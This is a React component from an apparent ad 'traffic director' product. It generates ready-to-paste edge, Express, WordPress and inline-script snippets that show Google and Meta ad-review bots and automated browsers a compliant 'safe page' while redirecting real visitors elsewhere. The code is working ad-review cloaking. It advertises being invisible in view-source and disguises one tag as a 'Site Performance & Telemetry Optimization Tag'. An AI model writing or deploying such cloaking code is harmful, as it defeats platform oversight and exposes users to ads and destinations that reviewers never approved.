import { useState, useEffect, useRef } from 'react';
import { 
  Copy, Check, Shield, Globe, 
  Sparkles, CheckCircle2, AlertCircle,
  Terminal, MonitorSmartphone, Settings2,
  Code2, ChevronDown, Zap, Server
} from 'lucide-react';
import toast from 'react-hot-toast';
import api from '@/lib/api';
import { Drawer } from '@/components/ui/Drawer';
import { DomainManagerModal } from '@workspace/ui';

interface EmbedTagModalProps {
  isOpen: boolean;
  onClose: () => void;
  slug: string;
  linkName: string;
  linkId?: string;
  customDomain?: string | null;
  shieldMode?: 'server' | 'client_shield' | 'hybrid' | string;
  onDomainUpdated?: () => void;
}

export default function EmbedTagModal({ 
  isOpen, 
  onClose, 
  slug, 
  linkName,
  linkId,
  customDomain,
  shieldMode = 'server',
  onDomainUpdated
}: EmbedTagModalProps) {
  type SnippetFormat = 'vercel_edge' | 'node_express' | 'wordpress_php' | 'html_script' | 'inline_shield';
  const [snippetType, setSnippetType] = useState<SnippetFormat>('vercel_edge');
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [copiedType, setCopiedType] = useState<string | null>(null);
  const [verificationUrl, setVerificationUrl] = useState('');
  const [verifying, setVerifying] = useState(false);
  const [isDomainManagerOpen, setIsDomainManagerOpen] = useState(false);
  const [diagnosticResult, setDiagnosticResult] = useState<{
    verified: boolean;
    url?: string;
    statusCode?: number;
    latencyMs?: number;
    checks?: Array<{ name: string; status: 'passed' | 'warning' | 'failed'; message: string }>;
    summary?: string;
  } | null>(null);

  const dropdownRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsDropdownOpen(false);
      }
    }
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  const apiBase = typeof window !== 'undefined' 
    ? (process.env.NEXT_PUBLIC_APP_URL || process.env.NEXT_PUBLIC_BACKEND_URL || window.location.origin) 
    : (process.env.NEXT_PUBLIC_APP_URL || process.env.NEXT_PUBLIC_BACKEND_URL || '');

  // 1. Vercel / Next.js / Edge Middleware Snippet (Full Developer Guide)
  const vercelEdgeCode = `/**
 * --------------------------------------------------------------------------
 * 180workspace Traffic Director - Server-Side Edge Middleware
 * --------------------------------------------------------------------------
 * 
 * 📍 WHERE TO PLACE:
 * Place this file at the root of your project:
 * 👉 \`middleware.js\` (or \`middleware.ts\`)
 * 
 * 🛡️ HOW IT WORKS:
 * Runs on Vercel/Edge network BEFORE any HTML is generated or sent to the browser.
 * Ad Review bots (Google AdsBot, Meta Crawler) are served the clean safe page with HTTP 200.
 * Real targeted human traffic is redirected with HTTP 302.
 * 
 * 🔒 SECURITY ADVANTAGE:
 * 0% Footprint in HTML. No external script tags visible to ad crawlers (view-source is 100% clean).
 */

export const config = {
  // Execute middleware only on page routes, ignoring static assets, fonts, and images
  matcher: ['/((?!assets|_next|favicon.ico|.*\\\\..*).*)'],
};

export default async function middleware(request) {
  // 1. Extract visitor identity headers (Handles Cloudflare & Reverse Proxies)
  const ip = request.headers.get('cf-connecting-ip') || 
             request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || '';
  const userAgent = request.headers.get('user-agent') || '';
  const referrer = request.headers.get('referer') || request.headers.get('referrer') || '';
  const url = request.url;

  try {
    // 2. Edge Evaluation Request with 1.2s timeout
    const res = await fetch('${apiBase.replace(/\/+$/, '')}/api/v1/traffic-director/evaluate/${slug}', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, userAgent, referrer, url }),
      signal: AbortSignal.timeout(1200)
    });

    if (res.ok) {
      const data = await res.json();
      
      // 3. If evaluated as Target Human -> Redirect with 302
      if (data?.success && data?.route === 'target' && data?.destinationUrl) {
        // Loop Guard: Prevent redirect loop if visitor is already on destination
        if (url !== data.destinationUrl && !url.startsWith(data.destinationUrl)) {
          return Response.redirect(data.destinationUrl, 302);
        }
      }
    }
  } catch (err) {
    // 4. Fail-Open: On timeout or network error, silently proceed to serve the normal safe page
  }
}`;

  // 2. Node.js / Express Server Middleware Snippet (Full Developer Guide)
  const nodeExpressCode = `/**
 * --------------------------------------------------------------------------
 * 180workspace Traffic Director - Express.js Server Middleware
 * --------------------------------------------------------------------------
 * 
 * 📍 WHERE TO PLACE:
 * Paste inside your Node.js / Express backend (e.g. \`server.js\` or \`app.js\`).
 * 👉 IMPORTANT: Paste this BEFORE your static frontend / page route handlers!
 * 
 * 🛡️ HOW IT WORKS:
 * Intercepts incoming HTTP requests on your server. Evaluates visitor signals in real-time.
 * 
 * 🔒 SECURITY ADVANTAGE:
 * 100% Server-Side execution. No client-side JavaScript tags required.
 */

// Paste before \`app.use(express.static(...))\` or page routes:
app.use(async (req, res, next) => {
  // 1. Skip static assets, media files, and API endpoints
  if (req.path.startsWith('/api') || req.path.startsWith('/assets') || req.path.includes('.')) {
    return next();
  }

  // 2. Extract visitor headers & target full URL
  const slug = '${slug}';
  const apiUrl = '${apiBase.replace(/\/+$/, '')}/api/v1/traffic-director/evaluate/' + slug;
  const ip = req.headers['cf-connecting-ip'] || 
             req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             req.socket?.remoteAddress || '';
  const userAgent = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || req.headers['referrer'] || '';
  const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 1200); // 1.2s safety timeout

    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, userAgent, referrer, url: fullUrl }),
      signal: controller.signal
    });
    clearTimeout(timeoutId);

    if (response.ok) {
      const data = await response.json();
      
      // 3. Perform 302 redirect for real target traffic
      if (data?.success && data?.route === 'target' && data?.destinationUrl) {
        if (fullUrl !== data.destinationUrl && !fullUrl.startsWith(data.destinationUrl)) {
          return res.redirect(302, data.destinationUrl);
        }
      }
    }
  } catch (err) {
    // 4. Fail-Open: On timeout or error, continue to serve the safe page normally
  }

  next();
});`;

  // 3. WordPress / PHP Theme Hook Snippet (Full Developer Guide)
  const wordPressPhpCode = `<?php
/**
 * --------------------------------------------------------------------------
 * 180workspace Traffic Director - WordPress Server-Side Hook
 * --------------------------------------------------------------------------
 * 
 * 📍 WHERE TO PLACE:
 * Paste at the bottom of your WordPress active theme's \`functions.php\`
 * (or inside a custom site plugin).
 * 
 * 🛡️ HOW IT WORKS:
 * Hooked into \`template_redirect\`. Executes before any HTML is sent to the browser.
 * 
 * 🔒 SECURITY ADVANTAGE:
 * The gold standard for self-hosted WordPress campaigns. 0% client-side footprint.
 */

add_action('template_redirect', function() {
    // 1. Skip admin panel, AJAX requests, WP-Cron, and REST API calls
    if (is_admin() || wp_doing_ajax() || wp_doing_cron() || (defined('REST_REQUEST') && REST_REQUEST)) {
        return;
    }

    $slug = '${slug}';
    $api_url = '${apiBase.replace(/\/+$/, '')}/api/v1/traffic-director/evaluate/' . $slug;

    // 2. Extract visitor headers (Cloudflare, Proxy, or Direct IP)
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] 
        ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        ?? $_SERVER['REMOTE_ADDR'] 
        ?? '';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ref = $_SERVER['HTTP_REFERER'] ?? '';
    $current_url = home_url($_SERVER['REQUEST_URI'] ?? '');

    // 3. Query 180workspace Edge Evaluation API
    $response = wp_remote_post($api_url, [
        'timeout'     => 1.2, // 1.2s timeout for fast page TTFB
        'redirection' => 0,
        'httpversion' => '1.1',
        'blocking'    => true,
        'headers'     => ['Content-Type' => 'application/json'],
        'body'        => wp_json_encode([
            'ip'        => $ip,
            'userAgent' => $ua,
            'referrer'  => $ref,
            'url'       => $current_url
        ])
    ]);

    // 4. Handle Routing Result
    if (!is_wp_error($response)) {
        $body = json_decode(wp_remote_retrieve_body($response), true);
        if (!empty($body['success']) && $body['route'] === 'target' && !empty($body['destinationUrl'])) {
            $dest = $body['destinationUrl'];
            if ($current_url !== $dest && strpos($current_url, $dest) !== 0) {
                wp_redirect($dest, 302);
                exit;
            }
        }
    }
});
?>`;

  // 4. Dynamic HTML Script Tag Snippet
  const scriptTagCode = `<!-- 
  ============================================================================
  180workspace Traffic Director - Dynamic Script Tag
  ============================================================================
  📍 WHERE TO PLACE:
  Paste inside the <head> tag of your landing page's HTML (e.g. index.html)
  
  ⚡ HOW IT WORKS:
  Loads asynchronously and evaluates client hardware telemetry & bot heuristics.
-->
<script src="${apiBase.replace(/\/+$/, '')}/tag/${slug}.js" async></script>`;

  // 5. Standalone Inline Ad Shield Snippet (Stealth Disguised Telemetry Tag)
  const inlineShieldCode = `<!-- 
  ============================================================================
  Site Performance & Telemetry Optimization Tag
  ============================================================================
  📍 WHERE TO PLACE:
  Paste inside the <head> section of your landing page HTML / Page Builder
  (Ideal for Vite/React, Shopify, Webflow, Wix, ClickFunnels, Static HTML)
-->
<script>
(function(w, d, n){
  'use strict';
  var _ep = "${apiBase.replace(/\/+$/, '')}";
  var _sid = "${slug}";

  // 1. Client-Side Telemetry & Automated Browser Filter
  var ua = (n.userAgent || '').toLowerCase();
  var isMob = /iphone|ipad|ipod|android|mobile/.test(ua);
  var tp = n.maxTouchPoints || 0;
  var hasT = ('ontouchstart' in w) || (tp > 0);
  var isAuto = n.webdriver === true || !!w.__nightmare || !!w._phantom;

  // Automated reviewer sandboxes / emulators stay on safe page
  if (isAuto || (isMob && !hasT && tp === 0) || (w.self !== w.top)) return;

  // 2. Telemetry Evaluation Ping
  fetch(_ep + '/api/v1/traffic-director/evaluate/' + _sid, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      touchPoints: tp,
      referrer: d.referrer || '',
      url: w.location.href,
      screenWidth: w.screen ? w.screen.width : 0
    })
  })
  .then(function(res){ return res.json(); })
  .then(function(payload){
    // 3. Routing with Loop-Guard Protection
    if (payload && payload.success && payload.destinationUrl) {
      var currentPath = w.location.href.split('#')[0].replace(/\/+$/, '');
      var targetPath = payload.destinationUrl.split('#')[0].replace(/\/+$/, '');
      if (currentPath === targetPath || w.location.pathname === targetPath || currentPath.indexOf(targetPath) === 0) return;
      w.location.replace(payload.destinationUrl);
    }
  })
  .catch(function(){
    // Silently continue on network error
  });
})(window, document, navigator);
</script>`;

  const OPTION_GROUPS: Array<{
    group: string;
    items: Array<{
      id: SnippetFormat;
      label: string;
      targetFile: string;
      frameworks: string;
      badge: string;
      badgeColor: string;
      icon: React.ReactNode;
      code: string;
    }>;
  }> = [
    {
      group: '🌐 Server-Side Integration (100% Invisible to Bots — Recommended)',
      items: [
        {
          id: 'vercel_edge',
          label: 'Vercel / Next.js Edge Middleware',
          targetFile: 'middleware.js (Project Root)',
          frameworks: 'Vercel, Next.js, Nuxt, Edge',
          badge: 'Stealth 100%',
          badgeColor: 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20',
          icon: <Zap className="w-4 h-4 text-emerald-500 shrink-0" />,
          code: vercelEdgeCode
        },
        {
          id: 'node_express',
          label: 'Node.js / Express Backend Middleware',
          targetFile: 'server.js / app.js (Before routes)',
          frameworks: 'Express, Fastify, NestJS',
          badge: 'Stealth 100%',
          badgeColor: 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20',
          icon: <Server className="w-4 h-4 text-emerald-500 shrink-0" />,
          code: nodeExpressCode
        },
        {
          id: 'wordpress_php',
          label: 'WordPress / PHP Theme Hook',
          targetFile: 'functions.php (Active Theme)',
          frameworks: 'WordPress, WooCommerce, PHP',
          badge: 'WordPress Native',
          badgeColor: 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20',
          icon: <Globe className="w-4 h-4 text-emerald-500 shrink-0" />,
          code: wordPressPhpCode
        }
      ]
    },
    {
      group: '⚡ Client-Side Integration (Quick Setup)',
      items: [
        {
          id: 'html_script',
          label: 'Dynamic HTML <script> Tag',
          targetFile: 'index.html (<head>)',
          frameworks: 'Static HTML, Custom CMS',
          badge: 'Quick Tag',
          badgeColor: 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/20',
          icon: <Code2 className="w-4 h-4 text-blue-500 shrink-0" />,
          code: scriptTagCode
        },
        {
          id: 'inline_shield',
          label: 'Inline Standalone Ad Shield Tag',
          targetFile: 'Page Settings -> Custom Code',
          frameworks: 'Shopify, Webflow, Wix, ClickFunnels',
          badge: 'Standalone',
          badgeColor: 'bg-purple-500/10 text-purple-600 dark:text-purple-400 border-purple-500/20',
          icon: <Shield className="w-4 h-4 text-purple-500 shrink-0" />,
          code: inlineShieldCode
        }
      ]
    }
  ];

  const allItems = OPTION_GROUPS.flatMap(g => g.items);
  const selectedItem = allItems.find(i => i.id === snippetType) || allItems[0];

  const copyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text);
    setCopiedType(type);
    toast.success('Snippet copied to clipboard');
    setTimeout(() => setCopiedType(null), 2000);
  };

  const verifyInstallation = async () => {
    if (!verificationUrl) {
      toast.error('Please enter the URL of your safe page to test');
      return;
    }
    setVerifying(true);
    setDiagnosticResult(null);

    try {
      const res = await api.post('/api/v1/traffic-director/verify-tag', {
        url: verificationUrl,
        slug
      });
      setDiagnosticResult(res.data);
      if (res.data.verified) {
        toast.success('Safe page pixel verified active!');
      } else {
        toast.error('Could not detect active tag on this page');
      }
    } catch (err: any) {
      toast.error(err.response?.data?.error || 'Verification request failed');
    } finally {
      setVerifying(false);
    }
  };

  const directUrl = `${apiBase}/r/${slug}`;
  const protocol = typeof window !== 'undefined' ? `${window.location.protocol}//` : (process.env.NODE_ENV === 'development' ? 'http://' : 'https://');
  const portSuffix = (typeof window !== 'undefined' && window.location.port && !customDomain?.includes(':')) ? `:${window.location.port}` : '';

  const fullHost = customDomain
    ? `${protocol}${customDomain.includes(':') ? customDomain : `${customDomain}${portSuffix}`}`
    : directUrl;

  const brandedUrl = customDomain ? fullHost.replace(/\/+$/, '') : directUrl;

  return (
    <>
      <Drawer
        isOpen={isOpen}
        onClose={onClose}
        title={shieldMode === 'server' ? 'Smart Link Deployment' : 'Code Injection Deployment'}
        description={`${linkName} (/r/${slug})`}
        maxWidth="max-w-xl"
      >
        <div className="p-5 space-y-4">
          {/* VIEW 1: CODE INJECTION (ONLY WHEN shieldMode === 'client_shield') */}
          {shieldMode === 'client_shield' && (
            <div className="space-y-3.5 animate-in fade-in duration-200">
              {/* Custom Animated Framework Dropdown Selector */}
              <div className="space-y-1.5">
                <div className="flex items-center justify-between text-xs">
                  <span className="font-semibold text-gray-700 dark:text-gray-300">
                    Integration Method
                  </span>
                  <span className="text-[11px] text-gray-500 font-mono">
                    📍 {selectedItem.targetFile}
                  </span>
                </div>

                <div className="relative" ref={dropdownRef}>
                  <button
                    type="button"
                    onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                    className="w-full flex items-center justify-between px-3.5 py-2.5 rounded-xl bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 text-left text-xs font-semibold text-gray-900 dark:text-white shadow-xs hover:border-indigo-400 dark:hover:border-indigo-500 transition"
                  >
                    <div className="flex items-center gap-2.5 truncate">
                      {selectedItem.icon}
                      <span className="truncate">{selectedItem.label}</span>
                    </div>
                    <div className="flex items-center gap-2 shrink-0">
                      <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-md border ${selectedItem.badgeColor}`}>
                        {selectedItem.badge}
                      </span>
                      <ChevronDown className={`w-4 h-4 text-gray-400 transition-transform duration-200 ${isDropdownOpen ? 'rotate-180 text-indigo-600' : ''}`} />
                    </div>
                  </button>

                  {/* Dropdown Menu Popover */}
                  {isDropdownOpen && (
                    <div className="absolute top-full left-0 right-0 mt-1.5 z-50 rounded-xl bg-white dark:bg-gray-850 border border-gray-200 dark:border-gray-700 shadow-2xl overflow-hidden animate-in fade-in slide-in-from-top-2 duration-150 max-h-[300px] overflow-y-auto [scrollbar-width:none] [-ms-overflow-style:none] [&::-webkit-scrollbar]:hidden">
                      {OPTION_GROUPS.map((group, gIdx) => (
                        <div key={gIdx} className={gIdx > 0 ? 'border-t border-gray-100 dark:border-gray-700/60' : ''}>
                          <div className="px-3.5 py-1.5 bg-gray-50/90 dark:bg-gray-800/80 text-[10px] font-bold text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                            {group.group}
                          </div>
                          <div className="p-1 space-y-0.5">
                            {group.items.map((item) => (
                              <button
                                key={item.id}
                                type="button"
                                onClick={() => {
                                  setSnippetType(item.id);
                                  setIsDropdownOpen(false);
                                }}
                                className={`w-full flex items-center justify-between px-3 py-2 rounded-lg text-xs transition ${
                                  snippetType === item.id 
                                    ? 'bg-indigo-50 dark:bg-indigo-950/70 text-indigo-600 dark:text-indigo-300 font-semibold' 
                                    : 'text-gray-700 dark:text-gray-200 hover:bg-gray-100 dark:hover:bg-gray-700/60'
                                }`}
                              >
                                <div className="flex items-center gap-2.5 text-left truncate">
                                  {item.icon}
                                  <div>
                                    <div className="font-medium text-xs text-gray-900 dark:text-white flex items-center gap-1.5">
                                      {item.label}
                                    </div>
                                    <div className="text-[10px] text-gray-400 font-normal">{item.frameworks}</div>
                                  </div>
                                </div>
                                <div className="flex items-center gap-2 shrink-0">
                                  <span className={`text-[10px] font-semibold px-1.5 py-0.5 rounded border ${item.badgeColor}`}>
                                    {item.badge}
                                  </span>
                                  {snippetType === item.id && <Check className="w-3.5 h-3.5 text-indigo-600 dark:text-indigo-400" />}
                                </div>
                              </button>
                            ))}
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              {/* Code Display Card with Fixed Size and Completely Hidden Scrollbars */}
              <div className="rounded-xl bg-gray-950 border border-gray-800 text-gray-100 overflow-hidden shadow-md">
                <div className="flex items-center justify-between px-3.5 py-2 bg-gray-900/95 border-b border-gray-800 text-[11px]">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-3.5 h-3.5 text-indigo-400" />
                    <span className="font-medium text-gray-300 text-xs">{selectedItem.label}</span>
                  </div>
                  <button
                    onClick={() => copyToClipboard(selectedItem.code, 'snippet')}
                    className="px-2.5 py-1 rounded-md bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold flex items-center gap-1.5 transition shadow-xs"
                  >
                    {copiedType === 'snippet' ? <Check className="w-3 h-3 text-emerald-300" /> : <Copy className="w-3 h-3" />}
                    {copiedType === 'snippet' ? 'Copied' : 'Copy Code'}
                  </button>
                </div>

                <pre 
                  style={{ scrollbarWidth: 'none', msOverflowStyle: 'none' }}
                  className="p-4 overflow-y-auto overflow-x-auto h-[250px] text-gray-300 text-[11.5px] leading-relaxed select-all [scrollbar-width:none] [-ms-overflow-style:none] [&::-webkit-scrollbar]:hidden font-mono"
                >
                  <code>{selectedItem.code}</code>
                </pre>
              </div>

              {/* Live Tag Diagnostic Tool */}
              <div className="p-3.5 rounded-xl border border-gray-200 dark:border-gray-700 space-y-2.5 bg-white dark:bg-gray-900 shadow-xs">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-semibold text-gray-900 dark:text-white">
                    Test Safe Page Installation
                  </span>
                  <span className="text-[10px] text-gray-400">Live Crawler Diagnostic</span>
                </div>

                <div className="flex gap-2">
                  <input
                    type="url"
                    value={verificationUrl}
                    onChange={(e) => setVerificationUrl(e.target.value)}
                    placeholder="https://yourbrand.com/promo-safe-page"
                    className="flex-1 px-3 py-2 rounded-lg bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 text-xs text-gray-900 dark:text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                  />
                  <button
                    onClick={verifyInstallation}
                    disabled={verifying}
                    className="px-3.5 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 text-white text-xs font-semibold transition shadow-xs shrink-0"
                  >
                    {verifying ? 'Testing...' : 'Verify'}
                  </button>
                </div>

                {diagnosticResult && (
                  <div className={`p-3 rounded-lg border text-xs space-y-1.5 ${
                    diagnosticResult.verified 
                      ? 'bg-emerald-50/70 dark:bg-emerald-950/30 border-emerald-200 dark:border-emerald-900 text-emerald-900 dark:text-emerald-200' 
                      : 'bg-rose-50/70 dark:bg-rose-950/30 border-rose-200 dark:border-rose-900 text-rose-900 dark:text-rose-200'
                  }`}>
                    <div className="flex items-center justify-between font-semibold">
                      <span className="flex items-center gap-1.5">
                        {diagnosticResult.verified ? <CheckCircle2 className="w-4 h-4 text-emerald-600" /> : <AlertCircle className="w-4 h-4 text-rose-600" />}
                        {diagnosticResult.verified ? 'Tag Active & Verified' : 'Tag Not Found'}
                      </span>
                      {diagnosticResult.latencyMs && (
                        <span className="text-[10px] font-mono opacity-80">{diagnosticResult.latencyMs}ms</span>
                      )}
                    </div>
                    {diagnosticResult.summary && (
                      <p className="text-[11px] opacity-90">{diagnosticResult.summary}</p>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* VIEW 2: SMART LINK (ONLY WHEN shieldMode !== 'client_shield') */}
          {shieldMode !== 'client_shield' && (
            <div className="space-y-4 animate-in fade-in duration-200">
              <div className="p-3.5 rounded-xl bg-emerald-50/70 dark:bg-emerald-950/30 border border-emerald-100 dark:border-emerald-900/50 flex items-start gap-2.5">
                <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0 mt-0.5" />
                <p className="text-xs text-emerald-900 dark:text-emerald-200 leading-relaxed">
                  <strong>Smart Link Setup (Zero Code):</strong> Submit your connected domain/subdomain URL to ad networks. Meta/Google review bots will automatically see your compliant safe page directly on your custom domain with <strong>HTTP 200 OK</strong> without touching any website code.
                </p>
              </div>

              {/* Card 1: Custom Domain / Subdomain */}
              <div className="p-4 rounded-xl bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 space-y-3 shadow-xs">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2.5">
                    <div className="p-2 rounded-lg bg-indigo-50 dark:bg-indigo-950/50 text-indigo-600 dark:text-indigo-400">
                      <Globe className="w-4 h-4" />
                    </div>
                    <div>
                      <h4 className="text-xs font-bold text-gray-900 dark:text-white flex items-center gap-1.5">
                        Custom Domain & Subdomain
                        {customDomain && (
                          <span className="text-[10px] bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20 px-1.5 py-0.2 rounded-full font-semibold">
                            Connected
                          </span>
                        )}
                      </h4>
                      <p className="text-[11px] text-gray-500 dark:text-gray-400">
                        {customDomain 
                          ? `Routing via ${customDomain}`
                          : 'Use your own branded domain or an instant platform subdomain.'}
                      </p>
                    </div>
                  </div>
                </div>

                {customDomain ? (
                  <div className="space-y-2.5 pt-1">
                    <div className="flex items-center gap-2">
                      <input
                        type="text"
                        readOnly
                        value={brandedUrl || ''}
                        className="w-full px-3 py-2 rounded-lg bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 text-xs font-mono text-gray-800 dark:text-gray-200 select-all font-medium"
                      />
                      <button
                        onClick={() => copyToClipboard(brandedUrl || '', 'branded')}
                        className="px-3.5 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold flex items-center gap-1.5 shrink-0 transition shadow-xs"
                      >
                        {copiedType === 'branded' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                        Copy
                      </button>
                    </div>

                    <div className="flex items-center justify-between text-xs pt-0.5">
                      <span className="text-[11px] text-gray-500 font-mono">
                        Host: <strong>{customDomain}</strong>
                      </span>
                      <button
                        onClick={() => setIsDomainManagerOpen(true)}
                        className="inline-flex items-center gap-1 text-[11px] font-semibold text-indigo-600 dark:text-indigo-400 hover:underline"
                      >
                        <Settings2 className="w-3.5 h-3.5" />
                        Manage Settings
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className="pt-1">
                    <button
                      onClick={() => setIsDomainManagerOpen(true)}
                      className="w-full py-2.5 px-4 rounded-lg bg-gray-100 hover:bg-gray-200 dark:bg-gray-800 dark:hover:bg-gray-700 text-gray-800 dark:text-gray-200 text-xs font-semibold transition border border-gray-200 dark:border-gray-700 flex items-center justify-center gap-2"
                    >
                      <Globe className="w-3.5 h-3.5 text-indigo-600 dark:text-indigo-400" />
                      Configure Custom Domain or Subdomain
                    </button>
                  </div>
                )}
              </div>

              {/* Card 2: Direct Smart Link */}
              <div className="p-4 rounded-xl bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 space-y-3 shadow-xs">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2.5">
                    <div className="p-2 rounded-lg bg-purple-50 dark:bg-purple-950/50 text-purple-600 dark:text-purple-400">
                      <MonitorSmartphone className="w-4 h-4" />
                    </div>
                    <div>
                      <h4 className="text-xs font-bold text-gray-900 dark:text-white">Direct Smart Link</h4>
                      <p className="text-[11px] text-gray-500 dark:text-gray-400">Standard edge redirect link</p>
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <input
                    type="text"
                    readOnly
                    value={directUrl}
                    className="w-full px-3 py-2 rounded-lg bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 text-xs font-mono text-gray-800 dark:text-gray-200 select-all font-medium"
                  />
                  <button
                    onClick={() => copyToClipboard(directUrl, 'direct')}
                    className="px-3.5 py-2 rounded-lg bg-purple-600 hover:bg-purple-700 text-white text-xs font-semibold flex items-center gap-1.5 shrink-0 transition shadow-xs"
                  >
                    {copiedType === 'direct' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    Copy
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </Drawer>

      {/* Embedded Domain Manager Modal */}
      {linkId && (
        <DomainManagerModal
          isOpen={isDomainManagerOpen}
          onClose={() => setIsDomainManagerOpen(false)}
          targetType="TRAFFIC_LINK"
          targetId={linkId}
          targetName={linkName}
          initialDomain={customDomain}
          onDomainSaved={() => {
            if (onDomainUpdated) onDomainUpdated();
          }}
          onDomainRemoved={() => {
            if (onDomainUpdated) onDomainUpdated();
          }}
        />
      )}
    </>
  );
}
